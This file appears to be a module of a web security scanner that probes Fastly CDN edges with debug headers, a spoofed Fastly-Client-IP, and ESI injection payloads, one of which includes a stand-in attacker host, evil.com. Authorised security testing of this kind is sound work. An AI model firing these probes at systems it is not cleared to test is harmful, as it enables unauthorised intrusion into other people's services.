#!/usr/bin/env python3

from utils.utils import requests


def fastly_vcl_test(url: str, s: requests.Session) -> None:
    """Test Fastly VCL edge logic"""
    # Test ESI (Edge Side Includes)
    esi_payloads = [
        '<esi:include src="/internal" />',
        '<esi:include src="http://evil.com" />'
    ]
    
    for payload in esi_payloads:
        try:
            headers = {"Surrogate-Capability": "abc=ESI/1.0"}
            req = s.get(url, headers=headers, data=payload, verify=False, timeout=10)
            if "internal" in req.text or "evil.com" in req.text:
                print(f"{Colors.RED}   └── [CRITICAL] ESI injection possible{Colors.RESET}")
        except Exception:
            pass


def fastly(url: str, s: requests.Session) -> None:
    """
    https://docs.fastly.com/en/guides/checking-cache
    https://developer.fastly.com/learning/vcl/using/
    """
    fastly_list = [
        {"Fastly-Debug": "1"},
        {"Fastly-Debug-Digest": "1"},
        {"Fastly-Debug-TTL": "1"},
        {"Surrogate-Capability": "abc=ESI/1.0"},
        {"Fastly-Client-IP": "127.0.0.1"},
        {"Fastly-FF": "!"}, 
    ]
    
    for fl in fastly_list:
        try:
            req = s.get(url, headers=fl, verify=False, timeout=10)
            print(f" └── {fl} -> {req.status_code}")
            
            # Check for Fastly-specific response headers
            fastly_resp_headers = [
                "x-served-by",
                "x-cache",
                "x-cache-hits",
                "fastly-io-info",
                "surrogate-control",
                "surrogate-key"
            ]
            
            for h in req.headers:
                if h.lower() in fastly_resp_headers or "fastly" in h.lower():
                    print(f"       {h}: {req.headers[h]}")
        except Exception:
            pass
    fastly_vcl_test(url, s)
